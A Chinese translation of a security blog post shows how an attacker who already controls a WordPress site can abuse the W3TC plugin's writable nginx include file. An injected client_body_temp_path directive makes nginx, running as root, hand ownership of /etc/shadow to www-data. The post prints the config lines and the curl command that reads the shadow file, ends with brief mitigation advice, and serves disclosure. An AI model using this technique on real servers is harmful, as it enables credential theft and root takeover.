
# 【技术分享】通过W3TC与Nginx获取服务器root权限


                                阅读量   
                                **107150**
                            
                        |
                        
                                                                                                                                    ![](./img/85721/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：tarq.io
                                <br>原文地址：[https://blog.tarq.io/root-your-box-with-w3tc-and-nginx/](https://blog.tarq.io/root-your-box-with-w3tc-and-nginx/)

译文仅供参考，具体内容表达以及含义原文为准



[![](./img/85721/t017bdbf0a7cfeea2ba.jpg)](./img/85721/t017bdbf0a7cfeea2ba.jpg)

作者：[360U2671379114](http://bobao.360.cn/member/contribute?uid=2671379114)

稿费：50RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

<br>

在人见人爱的WordPress缓存插件W3TC与Nignx结合时，有些教程告诉你要在Nginx的配置文件中加入像这样的东西：

```
location / {  
    include /var/www/wordpress/nginx.conf;
}
```

当我写这篇博客的时候，这条建议现在已经成为了关于“W3TC Nginx”搜索条目的第二大热门

如果你还不知道这个配置文件是可以被W3TC（以及加上扩展的PHP）重写的，这条建议的作用就是让W3TC能够重载Nginx的配置

现在我们假设攻击者已经攻破了你的WordPress站点，并且拥有了读写www-data的权限——这在Debian和其他一些Linux发行版上是PHP5-FPM默认的

攻击者就能够灵活的去运用一些Nginx配置选项，并且把W3TC的配置改成这样：

```
client_body_temp_path /etc/shadow;
# optional but more fun :)
location /wat {  
        alias /etc;
}
```

这告诉Nginx目前你使用/etc/shadow路径来存储缓存文件。显然，这并非一个文件夹，但让我们看看下次重启Nginx时会发生什么

```
# strace -e trace=chmod,chown -f nginx
chown("/etc/shadow", 33, 4294967295)    = 0  
+++ exited with 0 +++
```

显然，任何文件或文件夹一旦被攻击者写入到上述的配置文件，它的所有者都会被更改为www-data。要注意，这个现象是发生在Root用户的主进程中的，因此这对所有文件都是一样的

我们可以以这种方法通过PHP来读取到/etc/shadow或者主机的任意文件，而对于读取上述的shadow文件，我们还可以使用curl

```
$ curl -s http://localhost/wat/shadow | head
root:$6$IPIbhbCwb7gHQC&lt;SNIP&gt;:0:99999:7:::  
daemon:*:17074:0:99999:7:::  
bin:*:17074:0:99999:7:::  
sys:*:17074:0:99999:7:::  
sync:*:17074:0:99999:7:::  
games:*:17074:0:99999:7:::  
man:*:17074:0:99999:7:::  
lp:*:17074:0:99999:7:::  
mail:*:17074:0:99999:7:::  
news:*:17074:0:99999:7:::  
$ curl -s http://localhost/wat/shadow | head
root:$6$IPIbhbCwb7gHQC&lt;SNIP&gt;:0:99999:7:::  
daemon:*:17074:0:99999:7:::  
bin:*:17074:0:99999:7:::  
sys:*:17074:0:99999:7:::  
sync:*:17074:0:99999:7:::  
games:*:17074:0:99999:7:::  
man:*:17074:0:99999:7:::  
lp:*:17074:0:99999:7:::  
mail:*:17074:0:99999:7:::  
news:*:17074:0:99999:7:::
```

于是现在系统上所有的文件夹或文件所有权都能被更改为www-data了，并且攻击者获得了读写权限。而通过非暴力破解shadow文件手段来获取Root权限的shell的方式，则留给读者去练习和思考。

**<br>**

**关于降低危害的方法**

永远不要让PHP来替你管理Web服务器配置！
